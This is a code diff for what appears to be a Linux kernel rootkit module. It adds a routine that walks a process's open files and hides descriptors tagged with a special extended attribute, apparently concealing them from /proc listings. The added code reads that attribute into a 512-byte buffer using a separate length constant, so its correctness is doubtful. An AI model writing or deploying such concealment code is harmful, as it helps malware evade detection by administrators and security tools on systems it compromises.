@@ -1,5 +1,9 @@
 #include <linux/slab.h>
 #include <linux/fd.h>
+#include <linux/pid.h>
+#include <linux/sched.h>
+#include <linux/fdtable.h>
+#include <linux/xattr.h>
 
 #include "common.h"
 #include "hook.h"
@@ -16,7 +20,6 @@ fd_list_t hidden_fds = {
 
 fd_list_t_ptr hidden_fds_tail = &hidden_fds;
 
-//Returns pid on success, -1 on failure
 pid_t
 may_fd(struct file *dirfile)
 {
@@ -40,7 +43,9 @@ may_fd(struct file *dirfile)
              **/
             int i = 0;
 
-            while((sub = strsep(&cur, dir_sep))) {
+            while(sub = (strsep(&cur, dir_sep))) {
+                DEBUG_INFO("sub is %s\n", sub);
+
                 switch(i++) {
                     case 1:
                         if(strcmp(sub, "proc"))
@@ -64,13 +69,39 @@ may_fd(struct file *dirfile)
 
     leave:
     kfree(buf);
-    return -1;
+    return 0;
+}
+
+int
+fd_callback(const void *ptr, struct file *f, unsigned fd)
+{
+    struct inode *inode = f->f_inode;
+    char buf[512];
+
+    if(!inode_permission(inode, MAY_READ)) {
+        ssize_t len = vfs_getxattr(f->f_path.dentry, G7_XATTR_NAME, buf, BUFLEN);
+
+        if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL)))
+            add_fd_to_list(&hidden_fds, (int) fd);
+    }
+
+    return 0;
 }
 
 void
 fill_fds(pid_t pid)
 {
-    
+    struct pid *spid;
+    struct task_struct *task;
+    struct files_struct *fs;
+
+    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
+        return;
+
+    if(!(fs = get_files_struct(task)))
+        return;
+
+    iterate_fd(fs, 0, (void *)fd_callback, NULL);    
 }
 
 void
